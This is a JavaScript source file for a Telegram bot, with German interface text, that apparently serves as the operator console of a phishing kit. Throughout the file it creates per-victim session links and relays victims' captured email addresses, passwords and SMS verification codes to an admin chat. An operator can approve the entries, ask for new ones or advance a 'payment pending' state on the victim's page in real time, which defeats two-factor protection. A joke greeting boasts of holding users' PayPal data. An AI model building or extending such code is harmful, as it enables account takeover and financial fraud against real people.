const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { formatDate } = require('../utils/helpers');
const config = require('../config');

// Bot instance
let bot = null;
let io = null;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID;

// Store active sessions with their data
const activeSessions = new Map();

/**
 * Initialize the Telegram bot
 * @param {Object} socketIo - Socket.io server instance
 */
function initBot(socketIo) {
  // Store the Socket.io instance
  io = socketIo;
  
  // Check if token is available
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) {
    console.error('TELEGRAM_BOT_TOKEN is not set in environment variables');
    return;
  }
  
  // Create a bot instance
  bot = new TelegramBot(token, { polling: true });
  console.log('Telegram bot initialized');
  
  // Handle incoming messages
  bot.on('message', handleMessage);
  
  // Handle callback queries (button clicks)
  bot.on('callback_query', handleCallbackQuery);
  
  // Handle polling errors
  bot.on('polling_error', (error) => {
    // Only log the error once every 5 minutes to prevent log flooding
    const now = Date.now();
    if (!global.lastTelegramErrorTime || now - global.lastTelegramErrorTime > 300000) {
      console.error('Telegram polling error:', error.message);
      global.lastTelegramErrorTime = now;
    }
  });
}

/**
 * Handle incoming message
 * @param {Object} msg - Telegram message object
 */
function handleMessage(msg) {
  const chatId = msg.chat.id;
  const text = msg.text || '';
  
  // Check if this is the admin or the authorized group
  if ((GROUP_CHAT_ID && chatId.toString() !== GROUP_CHAT_ID.toString()) && 
      (ADMIN_CHAT_ID && chatId.toString() !== ADMIN_CHAT_ID.toString())) {
    bot.sendMessage(chatId, '⛔ Unbefugter Zugriff. Dieser Bot ist nur für Administratoren.');
    return;
  }
  
  // Handle commands
  if (text.startsWith('/')) {
    const command = text.split(' ')[0].toLowerCase();
    
    switch (command) {
      case '/start':
        handleStartCommand(chatId);
        break;
      case '/help':
        handleHelpCommand(chatId);
        break;
      case '/new':
      case '/generate':
        handleNewSessionCommand(chatId);
        break;
      case '/list':
      case '/sessions':
        listActiveSessions(chatId);
        break;
      case '/hello':
        handleHelloCommand(chatId, msg.from.first_name);
        break;
      default:
        bot.sendMessage(chatId, 'Unbekannter Befehl. Verwenden Sie /help für eine Liste der verfügbaren Befehle.');
    }
  }
}

/**
 * Handle /start command
 * @param {number} chatId - Telegram chat ID
 */
function handleStartCommand(chatId) {
  const welcomeMessage = `
🤖 *Willkommen beim Form Control Bot!*

Dieser Bot hilft Ihnen, Benutzerformulare zu verwalten.

Verfügbare Befehle:
📝 \`/new\` - Erstelle einen neuen Sitzungslink
📋 \`/list\` - Liste alle aktiven Sitzungen auf
❓ \`/help\` - Zeige diese Hilfe-Nachricht an
😈 \`/hello\` - Erhalten Sie eine "besondere" Begrüßung

_Erstellt mit ❤️ von Cascade_
  `;
  
  bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'HTML' });
}

/**
 * Handle /help command
 * @param {number} chatId - Telegram chat ID
 */
function handleHelpCommand(chatId) {
  const helpMessage = `
🤖 *Form Control Bot Hilfe*

Verfügbare Befehle:
\`/start\` - Starten Sie den Bot
\`/help\` - Zeige diese Hilfe-Nachricht an
\`/new\` - Erstellen Sie eine neue Sitzung
\`/list\` - Zeigen Sie aktive Sitzungen an
\`/hello\` - Erhalten Sie eine "besondere" Begrüßung

Anleitung:
1. Erstellen Sie eine neue Sitzung mit \`/new\`
2. Teilen Sie den Link mit dem Benutzer
3. Überprüfen Sie die Formulareingaben
4. Genehmigen oder ändern Sie die Eingaben
  `;
  
  bot.sendMessage(chatId, helpMessage, { parse_mode: 'HTML' });
}

/**
 * Handle /hello command
 * @param {number} chatId - Telegram chat ID
 * @param {string} firstName - User's first name
 */
function handleHelloCommand(chatId, firstName) {
  const evilGreetings = [
    `😈 *Willkommen in der Dunkelheit, ${firstName}!* Ihre Daten sind jetzt in meinen Händen... Muhahaha!`,
    `🔥 *Grüße, ${firstName}!* Willkommen in meinem Reich der digitalen Kontrolle. Ihre Sitzung wurde bereits... protokolliert.`,
    `👹 *Ah, ${firstName}!* Wie schön, dass Sie sich zu uns gesellen. Ihre PayPal-Daten sind bei mir in... sicheren Händen.`,
    `🦹‍♂️ *${firstName}!* Ihre Anwesenheit wurde vermerkt. Alle Systeme sind bereit, Ihre Befehle auszuführen... oder meine?`,
    `🕸️ *Willkommen im Netz, ${firstName}!* Ich habe auf Sie gewartet. Lassen Sie uns ein wenig... Spaß haben.`,
    `🧛‍♂️ *Guten Abend, ${firstName}!* Ihre digitale Seele gehört nun mir. Widerstand ist zwecklos!`
  ];
  
  // Select a random greeting
  const randomGreeting = evilGreetings[Math.floor(Math.random() * evilGreetings.length)];
  
  // Send the evil greeting
  bot.sendMessage(chatId, randomGreeting, { parse_mode: 'HTML' });
}

/**
 * Handle /new or /generate command
 * @param {number} chatId - Telegram chat ID
 */
function handleNewSessionCommand(chatId) {
  generateNewSession(chatId);
}

/**
 * Generate a new session and send the link to the admin
 * @param {number} chatId - Telegram chat ID
 */
async function generateNewSession(chatId) {
  try {
    // Use the config module to get the appropriate URLs for the current environment
    const serverUrl = config.baseUrl;
    const clientUrl = config.clientUrl;
    
    // Call the API to generate a new key
    const response = await axios.post(`${serverUrl}/api/generate-key`);
    const { key } = response.data;
    
    // Create the link
    const link = `${clientUrl}/${key}`;
    
    // Initialize session data
    activeSessions.set(key, {
      createdAt: new Date(),
      state: 'new',
      formData: {},
      messageIds: []
    });
    
    // Use GROUP_CHAT_ID if available, otherwise fall back to ADMIN_CHAT_ID
    const targetChatId = GROUP_CHAT_ID || ADMIN_CHAT_ID;
    
    // Send the link to the admin
    const message = `
🆕 *Neue Sitzung erstellt!*

🔑 *Sitzungsschlüssel:* \`${key}\`
🕒 *Erstellt:* ${formatDate(Date.now())}
🔗 *Teilen Sie diesen Link mit dem Benutzer:*
${link}

_Warten auf die Formulareingabe des Benutzers..._
    `;
    
    bot.sendMessage(targetChatId, message, { parse_mode: 'HTML' });
  } catch (error) {
    console.error('Error generating session:', error);
    bot.sendMessage(chatId, '❌ Fehler bei der Sitzungserstellung. Bitte versuchen Sie es erneut.');
  }
}

/**
 * List all active sessions
 * @param {number} chatId - Telegram chat ID
 */
async function listActiveSessions(chatId) {
  try {
    // Use GROUP_CHAT_ID if available, otherwise fall back to ADMIN_CHAT_ID
    const targetChatId = GROUP_CHAT_ID || ADMIN_CHAT_ID;
    
    // Check if this is the admin or the authorized group
    if ((GROUP_CHAT_ID && chatId.toString() !== GROUP_CHAT_ID.toString()) && 
        (ADMIN_CHAT_ID && chatId.toString() !== ADMIN_CHAT_ID.toString())) {
      bot.sendMessage(chatId, '⛔ Unbefugter Zugriff. Dieser Befehl ist nur für Administratoren.');
      return;
    }
    
    if (activeSessions.size === 0) {
      bot.sendMessage(targetChatId, '📝 *Keine aktiven Sitzungen vorhanden.*', { parse_mode: 'HTML' });
      return;
    }
    
    let message = '📋 *Aktive Sitzungen:*\n\n';
    
    // Convert Map to Array and sort by creation time (newest first)
    const sessionsArray = Array.from(activeSessions.entries()).sort((a, b) => {
      return new Date(b[1].createdAt) - new Date(a[1].createdAt);
    });
    
    // Format each session
    sessionsArray.forEach(([key, session], index) => {
      const formData = session.formData || {};
      const email = formData.email || 'N/A';
      const createdAt = session.createdAt ? formatDate(new Date(session.createdAt)) : 'Unbekannt';
      const state = getStateDescription(session.state);
      
      message += `*${index + 1}.* Sitzung: \`${key}\`\n`;
      message += `📧 E-Mail: ${email}\n`;
      message += `🕒 Erstellt: ${createdAt}\n`;
      message += `📊 Status: ${state}\n\n`;
    });
    
    // Add a note about using the session commands
    message += '_Verwenden Sie /session [ID], um Details zu einer bestimmten Sitzung anzuzeigen._';
    
    // Send the message
    bot.sendMessage(targetChatId, message, { parse_mode: 'HTML' });
  } catch (error) {
    console.error('Error listing active sessions:', error);
    bot.sendMessage(chatId, '❌ Fehler beim Abrufen der aktiven Sitzungen.');
  }
}

/**
 * Get a human-readable description of the session state
 * @param {string} state - Session state
 * @returns {string} - Human-readable description
 */
function getStateDescription(state) {
  switch (state) {
    case 'created':
      return '🆕 Erstellt';
    case 'form_1':
      return '📝 Formular 1 eingereicht';
    case 'code':
      return '🔑 Code eingegeben';
    case 'pending':
      return '⏳ Zahlung ausstehend';
    case 'confirmed':
      return '✅ Bestätigt';
    case 'ended':
      return '❌ Beendet';
    default:
      return state || 'Unbekannt';
  }
}

/**
 * Handle callback queries (button clicks)
 * @param {Object} query - Callback query object
 */
async function handleCallbackQuery(query) {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data;
  
  // Check if this is the admin or the authorized group
  if ((GROUP_CHAT_ID && chatId.toString() !== GROUP_CHAT_ID.toString()) && 
      (ADMIN_CHAT_ID && chatId.toString() !== ADMIN_CHAT_ID.toString())) {
    bot.answerCallbackQuery(query.id, { text: '⛔ Unbefugter Zugriff' });
    return;
  }
  
  try {
    // Parse the callback data
    const [action, key] = data.split(':');
    
    if (!key) {
      bot.answerCallbackQuery(query.id, { text: '❌ Ungültiger Sitzungsschlüssel' });
      return;
    }
    
    // Get session data
    const sessionData = activeSessions.get(key) || { formData: {} };
    
    // Use the config module to get the correct API URL for the current environment
    const apiBaseUrl = config.baseUrl;
    
    // Handle different actions
    switch (action) {
      case 'confirm_form':
        try {
          // Use the new forceStateUpdate function
          const success = await forceStateUpdate(key, 'form_2');
          
          if (!success) {
            throw new Error('Failed to update state');
          }
          
          // Update the message with form data still visible
          const formApprovedMessage = createFormDataMessage(key, sessionData.formData || {}, '✅ Formular genehmigt. Warten auf Verifizierungscode...');
          
          // Make sure we have valid text content
          if (!formApprovedMessage.text || formApprovedMessage.text.trim() === '') {
            throw new Error('Generated message text is empty');
          }
          
          await bot.editMessageText(formApprovedMessage.text, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: formApprovedMessage.reply_markup
          });
          
          // Answer the callback query
          bot.answerCallbackQuery(query.id, { text: '✅ Formular genehmigt' });
        } catch (error) {
          console.error('Error in confirm_form action:', error.message);
          bot.answerCallbackQuery(query.id, { text: '❌ Fehler: ' + error.message });
        }
        break;
      case 'request_new_form':
        // Use the new forceStateUpdate function
        await forceStateUpdate(key, 'form_1');
        
        // Update the message
        bot.editMessageText(`
🔄 *Neues Formular angefordert*

🔑 *Sitzung:* \`${key}\`
🕒 *Zeit:* ${formatDate(Date.now())}

_Warten auf die Formulareingabe des Benutzers..._
        `, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
              ]
            ]
          }
        });
        
        bot.answerCallbackQuery(query.id, { text: '🔄 Neues Formular angefordert' });
        break;
      case 'confirm_code':
        // Use the new forceStateUpdate function
        await forceStateUpdate(key, 'pending');
        
        // Update the message with all data still visible
        const successMessage = createCompleteDataMessage(key, sessionData.formData, sessionData.code, '✅ Code bestätigt. Zahlung wird verarbeitet...');
        
        bot.editMessageText(successMessage, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '🔄 Neuen Code anfordern', callback_data: `request_code:${key}` },
                { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
              ]
            ]
          }
        });
        
        bot.answerCallbackQuery(query.id, { text: '✅ Code bestätigt' });
        break;
      case 'request_new_code':
        // Use the new forceStateUpdate function
        await forceStateUpdate(key, 'reenter_code');
        
        // Update the message with form data still visible
        const newCodeMessage = createFormDataMessage(key, sessionData.formData, '🔄 Neuer Verifizierungscode angefordert.');
        
        bot.editMessageText(newCodeMessage.text, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'HTML',
          reply_markup: newCodeMessage.reply_markup
        });
        
        bot.answerCallbackQuery(query.id, { text: '🔄 Neuer Code angefordert' });
        break;
      case 'end_session':
        // Use the new forceStateUpdate function
        await forceStateUpdate(key, 'success');
        
        // Update the message
        const endSessionMessage = createCompleteDataMessage(key, sessionData.formData, sessionData.code, '✅ Sitzung erfolgreich abgeschlossen.');
        
        bot.editMessageText(endSessionMessage, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'HTML'
        });
        
        bot.answerCallbackQuery(query.id, { text: '✅ Sitzung abgeschlossen' });
        break;
      case 'request_code':
        // Use the new forceStateUpdate function
        await forceStateUpdate(key, 'reenter_code_after_pending');
        
        // Update the message with form data still visible
        const requestCodeMessage = createFormDataMessage(key, sessionData.formData, '🔄 Neuer Verifizierungscode angefordert.');
        
        bot.editMessageText(requestCodeMessage.text, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'HTML',
          reply_markup: requestCodeMessage.reply_markup
        });
        
        bot.answerCallbackQuery(query.id, { text: '🔄 Neuer Code angefordert' });
        break;
      default:
        bot.answerCallbackQuery(query.id, { text: '❓ Unbekannte Aktion' });
    }
  } catch (error) {
    console.error('Error handling callback query:', error);
    
    // Provide a more detailed error message to the user
    let errorMessage = '❌ Fehler bei der Anfrageverarbeitung';
    if (error.code) {
      errorMessage += ` (${error.code})`;
    }
    
    try {
      bot.answerCallbackQuery(query.id, { text: errorMessage });
    } catch (callbackError) {
      console.error('Error sending callback query answer:', callbackError);
    }
  }
}

/**
 * Force a state update by making a direct HTTP request to the client
 * @param {string} key - Session key
 * @param {string} state - New state
 */
async function forceStateUpdate(key, state) {
  try {
    const apiBaseUrl = config.baseUrl;
    
    // 1. Update the database via API
    await axios.post(`${apiBaseUrl}/api/state`, { key, state });
    console.log(`State updated in database: key=${key}, state=${state}`);
    
    // 2. Emit Socket.io event
    if (io) {
      io.to(key).emit('state_update', { key, state });
      io.emit('global_state_update', { key, state });
      console.log(`Socket.io events emitted for key=${key}, state=${state}`);
    } else {
      console.error('Socket.io instance not available');
    }
    
    // 3. Make a direct HTTP request to trigger SSE events
    await axios.post(`${apiBaseUrl}/api/force-update`, { key, state })
      .then(response => {
        console.log(`Force update response:`, response.data);
      })
      .catch(error => {
        console.error('Error in force update:', error.message);
      });
      
    // 4. Update local session data
    const sessionData = activeSessions.get(key) || { formData: {} };
    sessionData.state = state;
    activeSessions.set(key, sessionData);
    console.log(`Local session data updated: key=${key}, state=${state}`);
    
    return true;
  } catch (error) {
    console.error(`Error in forceStateUpdate for key=${key}, state=${state}:`, error.message);
    return false;
  }
}

/**
 * Notify admin about form submission or code entry
 * @param {string} key - Session key
 * @param {string} formType - Type of form ('form_1' or 'form_2')
 * @param {Object} data - Form data
 */
async function notifyAdmin(key, formType, data) {
  // Use GROUP_CHAT_ID if available, otherwise fall back to ADMIN_CHAT_ID
  const targetChatId = GROUP_CHAT_ID || ADMIN_CHAT_ID;
  
  if (!bot || !targetChatId) {
    console.error('Cannot notify admin: Bot not initialized or admin chat ID not set');
    return;
  }
  
  try {
    // Get session data
    let sessionData = activeSessions.get(key) || { 
      createdAt: new Date(),
      state: formType,
      formData: {},
      messageIds: []
    };
    
    let message;
    let inlineKeyboard;
    
    if (formType === 'form_1') {
      // Update session data with form information
      sessionData.formData = data;
      sessionData.state = 'form_1';
      
      // Format form data
      message = `
📝 *Neue Formulareingabe*

📋 *Formulardaten:*
📧 *E-Mail:* ${data.email || 'N/A'}
🔒 *Passwort:* ${data.password || 'N/A'}

🔑 *Sitzung:* \`${key}\`
🕒 *Zeit:* ${formatDate(Date.now())}
      `;
      
      // Create inline keyboard
      inlineKeyboard = {
        inline_keyboard: [
          [
            { text: '✅ Genehmigen', callback_data: `confirm_form:${key}` },
            { text: '🔄 Neues Formular anfordern', callback_data: `request_new_form:${key}` }
          ],
          [
            { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
          ]
        ]
      };
      
      // Update session in memory
      activeSessions.set(key, sessionData);
      
      // Send message with inline keyboard
      const sentMessage = await bot.sendMessage(targetChatId, message, {
        parse_mode: 'HTML',
        reply_markup: inlineKeyboard
      });
      
      // Store message ID for future reference
      sessionData.messageIds.push(sentMessage.message_id);
      activeSessions.set(key, sessionData);
    } else if (formType === 'code') {
      // Update session data with code
      sessionData.code = data.code;
      sessionData.state = 'code';
      
      // Format complete data with both form and code
      message = `
🔑 *Verifizierungscode eingegeben*

📋 *Formulardaten:*
📧 *E-Mail:* ${sessionData.formData.email || 'N/A'}
🔒 *Passwort:* ${sessionData.formData.password || 'N/A'}

🔑 *Verifizierungscode:* ${data.code || 'N/A'}

🆔 *Sitzung:* \`${key}\`
🕒 *Zeit:* ${formatDate(Date.now())}
      `;
      
      // Create inline keyboard with approve and request new code options
      inlineKeyboard = {
        inline_keyboard: [
          [
            { text: '✅ Bestätigen', callback_data: `confirm_code:${key}` },
            { text: '🔄 Neuen Code anfordern', callback_data: `request_new_code:${key}` }
          ],
          [
            { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
          ]
        ]
      };
      
      // Update session in memory
      activeSessions.set(key, sessionData);
      
      // Get the last message ID to update it
      const lastMessageId = sessionData.messageIds.length > 0 ? 
        sessionData.messageIds[sessionData.messageIds.length - 1] : null;
      
      if (lastMessageId) {
        // Update the existing message
        await bot.editMessageText(message, {
          chat_id: targetChatId,
          message_id: lastMessageId,
          parse_mode: 'HTML',
          reply_markup: inlineKeyboard
        });
      } else {
        console.error('No previous message found for session:', key);
        
        // Send message with inline keyboard as fallback
        const sentMessage = await bot.sendMessage(targetChatId, message, {
          parse_mode: 'HTML',
          reply_markup: inlineKeyboard
        });
        
        // Store message ID for future reference
        sessionData.messageIds.push(sentMessage.message_id);
        activeSessions.set(key, sessionData);
      }
    }
  } catch (error) {
    console.error('Error notifying admin:', error);
  }
}

/**
 * Notify admin about auto-generated sessions
 * @param {string} key - Session key
 */
async function notifyAutoGenerated(key) {
  try {
    // Create the session link
    const link = `http://localhost:5173/${key}`;
    
    // Use GROUP_CHAT_ID if available, otherwise fall back to ADMIN_CHAT_ID
    const targetChatId = GROUP_CHAT_ID || ADMIN_CHAT_ID;
    
    // Format the message
    const message = `
🔄 *Automatisch generierte Sitzung*

🔑 *Sitzungsschlüssel:* \`${key}\`
🕒 *Erstellt:* ${formatDate(Date.now())}
🔗 *Link:*
${link}

_Warten auf die Formulareingabe des Benutzers..._
    `;
    
    // Send message with inline keyboard
    const sentMessage = await bot.sendMessage(targetChatId, message, {
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
          ]
        ]
      }
    });
    
    // Initialize session data
    const sessionData = {
      createdAt: new Date(),
      state: 'created',
      formData: {},
      messageIds: [sentMessage.message_id]
    };
    
    // Store session data
    activeSessions.set(key, sessionData);
  } catch (error) {
    console.error('Error notifying auto-generated session:', error);
  }
}

/**
 * Notify admin about SMS code request
 * @param {string} key - Session key
 * @param {string} verificationMethod - Selected verification method
 */
async function notifySmsCodeRequest(key, verificationMethod) {
  if (!bot || !ADMIN_CHAT_ID) {
    console.error('Bot not initialized or ADMIN_CHAT_ID not set');
    return;
  }
  
  try {
    // Get session data
    let sessionData = activeSessions.get(key);
    if (!sessionData) {
      console.error('Session data not found for key:', key);
      return;
    }
    
    // Update session state
    sessionData.state = 'sms_requested';
    sessionData.verificationMethod = verificationMethod;
    
    // Format message with updated information
    const message = createFormDataMessage(key, {
      ...sessionData.formData,
      verificationMethod
    }, '🔔 *SMS-Code angefordert*');
    
    // Create inline keyboard - only end session option
    const inlineKeyboard = {
      inline_keyboard: [
        [
          { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
        ]
      ]
    };
    
    // Save updated session data
    activeSessions.set(key, sessionData);
    
    // Get the last message ID
    const lastMessageId = sessionData.messageIds[sessionData.messageIds.length - 1];
    
    if (lastMessageId) {
      // Update the existing message
      await bot.editMessageText(message.text, {
        chat_id: ADMIN_CHAT_ID,
        message_id: lastMessageId,
        parse_mode: 'HTML',
        reply_markup: inlineKeyboard
      });
    } else {
      console.error('No previous message found for session:', key);
      
      // Send message with inline keyboard as fallback
      const sentMessage = await bot.sendMessage(ADMIN_CHAT_ID, message.text, {
        parse_mode: 'HTML',
        reply_markup: inlineKeyboard
      });
      
      // Store message ID for future reference
      sessionData.messageIds.push(sentMessage.message_id);
      activeSessions.set(key, sessionData);
    }
  } catch (error) {
    console.error('Error notifying admin about SMS code request:', error);
  }
}

/**
 * Create a formatted message with form data
 * @param {string} key - Session key
 * @param {Object} formData - Form data
 * @param {string} statusMessage - Status message to display
 * @returns {Object} Message object with text and reply_markup
 */
function escapeHTML(text) {
  if (!text) return 'N/A';
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function createFormDataMessage(key, formData, statusMessage) {
  // Ensure formData is an object
  formData = formData || {};
  
  // Escape special characters in form data
  const safeEmail = escapeHTML(formData?.email);
  const safePassword = escapeHTML(formData?.password);
  
  // Create message text
  const text = `${statusMessage || ''}

📝 <b>Formular-Daten:</b>
📧 <b>E-Mail:</b> ${safeEmail}
🔒 <b>Passwort:</b> ${safePassword}

🔑 <b>Sitzung:</b> <code>${key}</code>
🕒 <b>Zeit:</b> ${formatDate(Date.now())}
  `;
  
  // Create inline keyboard
  const reply_markup = {
    inline_keyboard: [
      [
        { text: '✅ Genehmigen', callback_data: `confirm_form:${key}` }
      ],
      [
        { text: '🔄 Neues Formular anfordern', callback_data: `request_new_form:${key}` }
      ],
      [
        { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
      ]
    ]
  };
  
  return { text, reply_markup };
}

/**
 * Create a formatted message with complete session data
 * @param {string} key - Session key
 * @param {Object} formData - Form data
 * @param {string} code - Verification code
 * @param {string} statusMessage - Status message to display
 * @returns {string} Formatted message
 */
function createCompleteDataMessage(key, formData, code, statusMessage) {
  // Escape special characters in form data
  const safeEmail = escapeHTML(formData?.email);
  const safePassword = escapeHTML(formData?.password);
  const safeCode = escapeHTML(code);
  
  let message = `
${statusMessage}

📋 <b>Formulardaten:</b>
📧 <b>E-Mail:</b> ${safeEmail}
🔒 <b>Passwort:</b> ${safePassword}

🔑 <b>Verifizierungscode:</b> ${safeCode || 'N/A'}

🆔 <b>Sitzung:</b> <code>${key}</code>
🕒 <b>Zeit:</b> ${formatDate(Date.now())}
  `;
  
  return message;
}

/**
 * Send a notification about the session status
 * @param {string} key - Session key
 * @param {string} status - Session status
 */
async function notifySessionStatus(key, status) {
  try {
    // Get session data
    const sessionData = activeSessions.get(key);
    if (!sessionData) {
      console.error('Session not found:', key);
      return;
    }
    
    // Use GROUP_CHAT_ID if available, otherwise fall back to ADMIN_CHAT_ID
    const targetChatId = GROUP_CHAT_ID || ADMIN_CHAT_ID;
    
    let message;
    let inlineKeyboard;
    
    if (status === 'ended') {
      message = `
✅ *Sitzung beendet*

📋 *Formulardaten:*
📧 *E-Mail:* ${sessionData.formData.email || 'N/A'}
🔒 *Passwort:* ${sessionData.formData.password || 'N/A'}

🔑 *Verifizierungscode:* ${sessionData.code || 'N/A'}

🆔 *Sitzung:* \`${key}\`
🕒 *Zeit:* ${formatDate(Date.now())}

_Die Sitzung wurde erfolgreich beendet._
      `;
      
      inlineKeyboard = {
        inline_keyboard: [
          [
            { text: '🆕 Neue Sitzung erstellen', callback_data: 'new_session' }
          ]
        ]
      };
    } else if (status === 'payment_confirmed') {
      message = `
💰 *Zahlung bestätigt*

📋 *Formulardaten:*
📧 *E-Mail:* ${sessionData.formData.email || 'N/A'}
🔒 *Passwort:* ${sessionData.formData.password || 'N/A'}

🔑 *Verifizierungscode:* ${sessionData.code || 'N/A'}

🆔 *Sitzung:* \`${key}\`
🕒 *Zeit:* ${formatDate(Date.now())}

_Die Zahlung wurde bestätigt. Der Benutzer wird zur Erfolgsseite weitergeleitet._
      `;
      
      inlineKeyboard = {
        inline_keyboard: [
          [
            { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
          ]
        ]
      };
    }
    
    // Get the last message ID to update it
    const lastMessageId = sessionData.messageIds.length > 0 ? 
      sessionData.messageIds[sessionData.messageIds.length - 1] : null;
    
    if (lastMessageId) {
      // Update the existing message
      await bot.editMessageText(message, {
        chat_id: targetChatId,
        message_id: lastMessageId,
        parse_mode: 'HTML',
        reply_markup: inlineKeyboard
      });
    } else {
      console.error('No previous message found for session:', key);
      
      // Send message with inline keyboard as fallback
      const sentMessage = await bot.sendMessage(targetChatId, message, {
        parse_mode: 'HTML',
        reply_markup: inlineKeyboard
      });
      
      // Store message ID for future reference
      sessionData.messageIds.push(sentMessage.message_id);
      activeSessions.set(key, sessionData);
    }
  } catch (error) {
    console.error('Error sending session status notification:', error);
  }
}

module.exports = {
  initBot,
  handleMessage,
  handleCallbackQuery,
  notifyAdmin,
  notifySmsCodeRequest,
  notifyAutoGenerated,
  generateNewSession,
  listActiveSessions,
  notifySessionStatus
};
